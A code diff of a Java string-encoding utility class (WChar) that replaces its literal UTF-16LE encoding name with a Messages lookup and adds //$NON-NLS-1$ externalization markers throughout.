@@ -12,6 +12,7 @@ package com.android.service.util;
 import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 
+import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 
 // TODO: Auto-generated Javadoc
@@ -20,7 +21,7 @@ import com.android.service.auto.Cfg;
  */
 public final class WChar {
 	/** The debug. */
-	private static final String TAG = "WChar";
+	private static final String TAG = "WChar"; //$NON-NLS-1$
 
 	/**
 	 * Gets the bytes.
@@ -46,10 +47,10 @@ public final class WChar {
 		byte[] encoded = null;
 
 		try {
-			encoded = string.getBytes("UnicodeLittleUnmarked"); // UTF-16LE
+			encoded = string.getBytes(Messages.getString("34.0")); // UTF-16LE //$NON-NLS-1$
 		} catch (final UnsupportedEncodingException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: UnsupportedEncodingException");
+				Check.log(TAG + " Error: UnsupportedEncodingException") ;//$NON-NLS-1$
 			}
 		}
 
@@ -81,7 +82,7 @@ public final class WChar {
 		System.arraycopy(Utils.intToByteArray(len), 0, pascalzeroencoded, 0, 4);
 		System.arraycopy(message, 0, pascalzeroencoded, 4, message.length);
 		if (Cfg.DEBUG) {
-			Check.ensures(pascalzeroencoded[len - 1] == 0, "pascalize not null");
+			Check.ensures(pascalzeroencoded[len - 1] == 0, "pascalize not null"); //$NON-NLS-1$
 		}
 		return pascalzeroencoded;
 	}
@@ -113,14 +114,14 @@ public final class WChar {
 	 * @return the string
 	 */
 	public static String getString(final byte[] message, final int offset, final int length, final boolean endzero) {
-		String decoded = "";
+		String decoded = ""; //$NON-NLS-1$
 
 		try {
-			decoded = new String(message, offset, length, "UnicodeLittleUnmarked");
+			decoded = new String(message, offset, length, Messages.getString("34.0")); //$NON-NLS-1$
 
 		} catch (final UnsupportedEncodingException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: UnsupportedEncodingException");
+				Check.log(TAG + " Error: UnsupportedEncodingException") ;//$NON-NLS-1$
 			}
 		}
 
